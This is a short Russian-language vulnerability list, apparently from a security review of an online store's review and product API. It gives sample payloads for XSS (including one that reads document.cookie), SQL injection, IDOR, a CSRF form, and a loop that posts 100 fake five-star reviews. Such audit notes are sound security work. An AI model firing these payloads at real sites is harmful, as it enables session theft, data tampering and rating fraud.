## 🔴 Новые уязвимости

### 1. XSS в форме отзывов (CWE-79)
```javascript
// Уязвимо - не санитизируется
userName: "<script>alert(1)</script>"
text: "<img src=x onerror=alert(document.cookie)>"
```

### 2. SQL Injection в фильтрах (CWE-89)
```javascript
/api/products?category=1' OR 1=1--
/api/products?priceMin=-1&priceMax=999999999
```

### 3. IDOR в отзывах (CWE-639)
```javascript
/api/reviews/edit?id=123&userId=456
// Можно редактировать чужие отзывы
```

### 4. CSRF при отправке отзыва (CWE-352)
```html
<form action="https://omnimarket.ru/api/reviews" method="POST">
  <input name="text" value="Купите здесь: evil.com">
</form>
```

### 5. Манипуляция рейтингом (CWE-840)
```javascript
// Отправка множества отзывов с 5 звездами
for (let i = 0; i < 100; i++) {
  fetch('/api/reviews', {
    method: 'POST',
    body: { rating: 5, text: 'Отлично!' }
  });
}
```
